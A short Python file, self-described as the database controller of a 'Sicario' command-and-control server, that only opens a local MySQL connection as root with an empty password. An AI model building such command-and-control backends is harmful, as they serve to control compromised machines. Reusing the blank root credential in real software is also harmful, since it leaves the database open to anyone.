#!/usr/bin/python

import sicario

# Sicario C&C server
# database controller

import pymysql.cursors
import pymysql

class Database:
	handler = False
	cursor = False
	
	def __init__ (self):
		try:
			self.handler = connection = pymysql.connect(host='localhost',
                             user='root',
                             password='',
                             db='sicario',
                             charset='utf8mb4',
                             cursorclass=pymysql.cursors.DictCursor)
		except:
			self.handler = False
			raise IOError('Failed to connect to database!')
		self.cursor = self.handler.cursor()

	def getHandler (self):
		return self.handler